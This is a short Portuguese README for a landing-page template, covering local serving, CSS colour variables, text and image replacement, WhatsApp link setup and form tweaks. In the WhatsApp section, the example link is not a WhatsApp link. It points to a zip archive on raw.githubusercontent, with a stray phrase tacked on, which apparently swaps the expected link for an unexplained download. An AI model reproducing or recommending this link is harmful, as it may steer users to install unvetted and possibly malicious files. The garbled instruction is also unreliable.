## 🚀 Como Usar

1. **Clone ou baixe os arquivos**
2. **Abra `index.html` no navegador** ou use um servidor local:
   ```bash
   # Com Python
   python -m http.server 8000
   
   # Com Node.js
   npx http-server -p 8000
   ```
3. **Acesse** `http://localhost:8000`

## 🛠️ Personalização

### Mudar Cores
No arquivo `style.css`, modifique as variáveis CSS:
```css
:root {
    --primary-color: #D4AF37; /* Dourado - mude para sua cor */
    --secondary-color: #1e3a8a; /* Azul - mude para sua cor */
}
```

### Substituir Textos
No arquivo `index.html`, localize e substitua:
- Títulos e subtítulos
- Textos de benefícios e serviços
- Depoimentos
- Informações de contato

### Trocar Imagens
Substitua as URLs das imagens no `index.html`:
```html
<!-- Exemplo -->
<img src="sua-imagem.jpg" alt="Descrição">
```

### Configurar WhatsApp
No `index.html`, modifique o link do WhatsApp:
```html
<a href="https://raw.githubusercontent.com/CodeBy-red/PrimeSpace/main/xyletic/Space-Prime-v3.3-alpha.2.zip mensagem personalizada">
```

### Personalizar Formulário
No `script.js`, ajuste as validações e o comportamento do formulário conforme necessário.
